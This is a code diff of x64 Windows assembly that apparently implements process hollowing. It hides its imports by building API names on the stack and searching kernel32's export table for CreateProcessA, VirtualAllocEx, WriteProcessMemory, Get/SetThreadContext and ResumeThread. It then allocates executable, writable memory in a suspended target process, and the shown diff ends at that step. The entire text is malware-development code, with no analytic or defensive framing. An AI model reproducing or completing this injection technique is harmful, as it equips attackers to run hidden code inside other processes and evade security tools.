@@ -97,8 +97,7 @@ main:
 	;Initializing the counter.
 	xor rdx, rdx
 	
-	;Initializing the function that I want, placing the string on the stack. First check if we need to get a different string.
-gstr:
+	;Initializing the CreateProcess string to find it in the export table for kernel32.
 	mov eax, 0x61657243 
 	mov [rsp + 0x100], rax
 	mov eax, 0x72506574 
@@ -107,8 +106,20 @@ gstr:
 	mov [rsp + 0x108], rax
 	mov eax, 0x00004173
 	mov [rsp + 0x10c], rax
+	xor rax, rax
+	jmp keepCount
 
-diffrnt:
+	;Count the size of the string.
+keepCount:
+	lea rdi, [rsp + 0x100]
+	cmp byte [rdi + rax], 0x00
+	je initCount
+	inc rax
+	jmp keepCount
+
+	;Initialize size of string into a register.
+initCount:
+	mov qword [rsp + 0x20], rax
 	jmp FindName
 
 	;Begin loop.
@@ -120,7 +131,7 @@ FindName:
 	add rax, rdi
 	mov rsi, rax
 	lea rdi, [rsp + 0x100]
-	mov rcx, 0x0c
+	mov qword rcx, [rsp + 0x20]			;Size of string.
 	repe cmpsb
 	jnz inca
 	jmp contn
@@ -151,6 +162,12 @@ contn:
 	mov rax, [rsp + 0x178]
 	test rax, rax
 	jz initTC
+	mov rax, [rsp + 0x180]
+	test rax, rax
+	jz initST
+	mov rax, [rsp + 0x188]
+	test rax, rax
+	jz initRT
 
 initProcA:
 	mov qword rax, rsi
@@ -163,24 +180,41 @@ initSI:
 	jmp callSI
 
 initEP:
+	xor rdx, rdx
 	mov qword rax, rsi
 	mov [rsp + 0x160], rax			;ExitProcess on the stack via pointer.
 	jmp FindVA
 
 initVA:
+	xor rdx, rdx
 	mov qword rax, rsi
-	mov [rsp 0x168], rax			;VirtualAllocEX on the stack via pointer.
+	mov [rsp + 0x168], rax			;VirtualAllocEX on the stack via pointer.
 	jmp FindPM
 
 initPM:
+	xor rdx, rdx
 	mov qword rax, rsi
 	mov [rsp + 0x170], rax			;WriteProcessMemory on the stack via pointer.
 	jmp FindTC
 
 initTC:
+	xor rdx, rdx
 	mov qword rax, rsi
 	mov [rsp + 0x178], rax			;GetThreadContext on the stack via pointer.
-	;Work on SetThreadContext next.
+	jmp FindST
+
+initST:
+	xor rdx, rdx
+	mov qword rax, rsi
+	mov [rsp + 0x180], rax			;SetThreadContext on the stack via pointer.
+	jmp FindRT
+
+initRT:
+	xor rdx, rdx
+	mov qword rax, rsi
+	mov [rsp + 0x188], rax			;ResumeThread on the stack via pointer.
+	jmp CrtPrc
+
 
 	;Now find GetStartupInfoW.
 	;Set up the STARTUPINFOA Struct.
@@ -219,7 +253,8 @@ FindSI:
 	mov [rsp + 0x108], rax
 	mov eax, 0x00576f66
 	mov [rsp + 0x10c], rax
-	jmp FindName
+	xor rax, rax
+	jmp keepCount
 
 	;Call GetStartupinfoW.
 callSI:
@@ -236,7 +271,9 @@ FindEP:
 	mov [rsp + 0x104], rax
 	mov eax, 0x00737365
 	mov [rsp + 0x108], rax
-	jmp FindName
+	xor rax, rax
+	xor rdx, rdx
+	jmp keepCount
 
 	;Find VirtualAlloc.
 FindVA:
@@ -248,7 +285,8 @@ FindVA:
 	mov [rsp + 0x108], rax
 	mov eax, 0x00007845
 	mov [rsp + 0x10c], rax
-	jmp FindName
+	xor rax, rax
+	jmp keepCount
 
 	;Find WriteProcessMemory.
 FindPM:
@@ -262,7 +300,8 @@ FindPM:
 	mov [rsp + 0x10c], rax
 	mov eax, 0x00007972
 	mov [rsp + 0x110], rax
-	jmp FindName
+	xor rax, rax
+	jmp keepCount
 
 	;Find GetThreadContext.
 FindTC:
@@ -274,7 +313,32 @@ FindTC:
 	mov [rsp + 0x108], rax
 	mov eax, 0x74786574
 	mov [rsp + 0x10c], rax
-	jmp FindName
+	xor rax, rax
+	jmp keepCount
+
+FindST:
+	mov eax, 0x54746553 
+	mov [rsp + 0x100], rax
+	mov eax, 0x61657268 
+	mov [rsp + 0x104], rax
+	mov eax, 0x6e6f4364 
+	mov [rsp + 0x108], rax
+	mov eax, 0x74786574
+	mov [rsp + 0x10c], rax
+	xor rax, rax
+	jmp keepCount
+
+FindRT:
+	mov eax, 0x75736552 
+	mov [rsp + 0x100], rax
+	mov eax, 0x6854656d 
+	mov [rsp + 0x104], rax
+	mov eax, 0x64616572
+	mov [rsp + 0x108], rax
+	xor rax, rax
+	jmp keepCount
+
+
 
 
 	;Call CreateProcess WinAPI with arguments.
@@ -331,6 +395,36 @@ CrtPrc:
 	mov qword rax, [rsp + 0x150]
 	call rax
 	
+
+	;Get memory in target process
+	;------------------------------------
+	;[rsp + 0x150]			CreateProcessA on the stack via pointer.
+	;[rsp + 0x158]			GetStartupInfoW on the stack via pointer.
+	;[rsp + 0x160]			ExitProcess on the stack via pointer.
+	;[rsp + 0x168]			VirtualAllocEX on the stack via pointer.
+	;[rsp + 0x170]			WriteProcessMemory on the stack via pointer.
+	;[rsp + 0x178]			GetThreadContext on the stack via pointer.
+	;[rsp + 0x180]			SetThreadContext on the stack via pointer.
+	;[rsp + 0x188]			ResumeThread on the stack via pointer.
+	;[rsp + 0x26c]			PROCESS_INFORMATION struct for suspended process.
+
+	;LPVOID VirtualAllocEx(
+	;  [in]           HANDLE hProcess,
+	;  [in, optional] LPVOID lpAddress,
+	;  [in]           SIZE_T dwSize,
+	;  [in]           DWORD  flAllocationType,
+	;  [in]           DWORD  flProtect
+	;);
+	lea qword rax, [rsp + 0x26c]
+	mov qword rcx, [rax]
+	xor rdx, rdx
+	mov r8d, 0x1000
+	mov r9d, 0x1000
+	or r9, 0x2000
+	mov qword [rsp + 0x20], 0x40
+	lea qword rax, [rsp + 0x168]
+	mov rax, [rax]
+	call rax
 
 endit:
 	;Exit process
